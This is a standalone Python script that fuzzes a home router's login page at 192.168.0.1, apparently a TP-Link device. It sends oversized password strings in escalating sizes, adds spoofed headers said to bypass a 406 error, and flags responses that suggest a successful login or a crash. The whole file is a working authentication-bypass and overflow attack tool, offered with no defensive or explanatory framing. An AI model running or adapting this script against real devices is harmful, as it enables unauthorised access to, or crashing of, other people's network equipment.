import urllib.request
import urllib.parse
import urllib.error
import time

TARGET = "http://192.168.0.1/cgi/login"
DELAY = 1.0

# Base headers required to bypass 406
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Referer": "http://192.168.0.1/",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest"
}

def test_overflow(payload_size):
    # The vulnerability involves sending an overly long password string.
    # We'll use 'A's to create the long string.
    # The encrypt.js uses base64 before encrypting, so we'll simulate a long base64 string
    long_string = "A" * payload_size
    
    # We'll try sending it as both UserName and Passwd parameters to cover our bases
    data = urllib.parse.urlencode({
        "UserName": "admin",
        "Passwd": long_string,
        "Action": "1",
        "LoginStatus": "0"
    }).encode('utf-8')
    
    url = f"{TARGET}?{data.decode('utf-8')}"
    req = urllib.request.Request(url, data=b"", headers=HEADERS, method='POST')
    
    try:
        response = urllib.request.urlopen(req, timeout=5)
        status = response.getcode()
        body = response.read().decode('utf-8', errors='ignore')
        
        # Check if the response indicates a successful login or a crash
        if status == 200:
            if "$.ret=0;" in body or "$.ret=1;" in body: # Assuming 0 or 1 might indicate success based on typical TP-Link responses
                print(f"[!!!] POTENTIAL SUCCESS: Payload size {payload_size} returned: {body.strip()}")
            elif "$.ret=71234;" not in body:
                print(f"[+] Interesting response at size {payload_size}: {body.strip()}")
            else:
                pass # Normal error response
        else:
             print(f"[*] Payload size {payload_size} returned status: {status}")
             
    except urllib.error.HTTPError as e:
        print(f"[*] Payload size {payload_size} HTTP Error: {e.code}")
    except Exception as e:
        print(f"[-] Payload size {payload_size} Error: {str(e)}")

print(f"[*] Testing Password Overflow against {TARGET}")
# Test various sizes, from slightly large to very large
sizes_to_test = [256, 512, 1024, 2048, 4096, 8192, 16384]

for size in sizes_to_test:
    print(f"[*] Testing size: {size} bytes")
    test_overflow(size)
    time.sleep(DELAY)

print("[*] Overflow testing complete.")
